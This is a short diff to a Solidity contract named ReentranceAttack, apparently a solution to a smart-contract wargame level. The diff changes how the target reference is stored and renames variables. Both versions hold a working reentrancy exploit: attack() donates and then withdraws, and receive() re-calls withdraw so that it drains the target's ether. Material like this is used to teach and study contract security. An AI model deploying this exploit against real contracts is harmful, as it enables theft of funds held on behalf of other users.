@@ -10,21 +10,21 @@ interface IReentrance {
 }
 
 contract ReentranceAttack {
-    address target;
+    IReentrance target;
 
-    constructor(address _target) public {
-        target = _target;
+    constructor(address _targetAddress) public {
+        target = IReentrance(_targetAddress);
     }
 
     function attack() external payable {
-        IReentrance(target).donate{value: msg.value}(address(this));
-        uint256 balance = IReentrance(target).balanceOf(address(this));
-        IReentrance(target).withdraw(balance);
+        target.donate{value: msg.value}(address(this));
+        uint256 _balance = target.balanceOf(address(this));
+        target.withdraw(_balance);
     }
 
     receive() external payable {
-        if (target.balance >= msg.value) {
-            IReentrance(target).withdraw(msg.value);
+        if (address(target).balance >= msg.value) {
+            target.withdraw(msg.value);
         }
     }
 }
